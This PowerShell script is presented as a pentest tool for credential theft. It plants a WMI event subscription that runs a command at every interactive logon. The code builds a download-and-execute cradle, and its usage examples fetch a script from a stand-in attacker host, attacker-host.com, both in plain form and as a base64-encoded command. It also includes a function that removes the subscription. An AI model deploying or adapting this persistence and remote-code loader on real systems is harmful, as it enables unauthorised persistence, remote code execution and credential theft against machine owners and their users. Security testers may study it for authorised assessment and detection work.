<#
.Synopsis
   Set-LogonWatcher creates a WMI event handler in order to execute a command upon local or remote interactive user login. 
.DESCRIPTION
   Set-LogonWatcher creates a WMI event handler in order to execute a command upon local or remote interactive user login.
   The primary purpose of the tool is to support credential theft during a pentest.
   Parameters:
   -URL An URL of a PowerShell script to load and execute.
   -Command PowerShell command(s) to execute.
   -EncodedCommand Base64 encoded PowerShell command(s).

   The EncodedCommand parameter can't be used together with the other two parameters.
   This script requires local admin privileges!

.EXAMPLE
   Set-LogonWatcher -URL http://attacker-host.com/attacker-script.ps1 -Command Invoke-AttackerScript
.EXAMPLE
   Set-LogonWatcher -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGU AcgAtAGgAbwBzAHQALgBjAG8AbQAvAGEAdAB0AGEAYwBrAGUAcgAtAHMAYwByAGkAcAB0AC4AcABzADEAJwApACkAOwBJAG4AdgBvAGsAZQAtAEEAdAB0AGEAYwBrAGUAcgBTAGMAcgBpAHAAdAA=
#>
function Set-LogonWatcher
{
    Param
    (
        # URL to load the remote code from
        [string]
        $URL,
        
        # Command to execute
        [string]
        $Command,

        # Base64 encoded command
        [string]
        $EncodedCommand
    )
    if ($URL -eq "" -and $Command -eq "" -and $EncodedCommand -eq "")
    {
        Write-Error "Please provide parameters"
        return
    }
    if ($Command -ne "" -and $EncodedCommand -ne "")
    {
        Wite-Error "Command and EncodedCommand parameters are mutually exclusive"
        return
    }
    $computer = $env:computername
    $wmiNS="root\subscription"
    $filterNS="root\cimv2"

    $query=@"
SELECT * FROM __InstanceCreationEvent WITHIN 3 WHERE TargetInstance ISA 'Win32_LogonSession' and (TargetInstance.LogonType = 2 or TargetInstance.LogonType >= 10)
"@
    $cmdtext = "powershell.exe -EncodedCommand "
    if ($URL -eq "" -and $Command -eq "")
    {
        $cmdtext = $cmdtext + $EncodedCommand
    }
    else
    {
        $RawCommand=""
        if ($URL -ne "")
        {
            $RawCommand="Invoke-Expression((new-object Net.WebClient).DownloadString('$URL'));"
        }
        if ($Command -ne "")
        {
            $RawCommand+=$Command
        }
    
        $cmdbytes = [System.Text.Encoding]::Unicode.GetBytes($RawCommand)
        $encCommand = [Convert]::ToBase64String($cmdbytes)
        $cmdtext+=$encCommand
    }
    $filterPath = Set-WmiInstance -Class __EventFilter `
        -ComputerName $computer -Namespace $wmiNS -Arguments `
        @{name="logon_event"; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}

    $consumerPath = Set-WmiInstance -Class CommandLineEventConsumer `
        -ComputerName $computer -Namespace $wmiNS `
        -Arguments @{name="logon_action"; CommandLineTemplate=$cmdtext; RunInteractively = $False;}

    Set-WmiInstance -Class __FilterToConsumerBinding -ComputerName $computer `
        -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} | out-null
}

<#
.Synopsis
   Remove-LogonWatcher removes the WMI event handler which was created with Set-LogonWatcher
.DESCRIPTION
   Remove-LogonWatcher removes the WMI event handler which was created with Set-LogonWatcher.
   
   This script requires local admin privileges!

.EXAMPLE
   Remove-LogonWatcher
#>
function Remove-LogonWatcher
{
    gwmi __eventFilter -namespace root\subscription -filter "name='logon_event'"| Remove-WmiObject
    gwmi CommandLineEventConsumer -Namespace root\subscription -Filter "name='logon_action'" | Remove-WmiObject
    gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='logon_event'"""  | Remove-WmiObject
}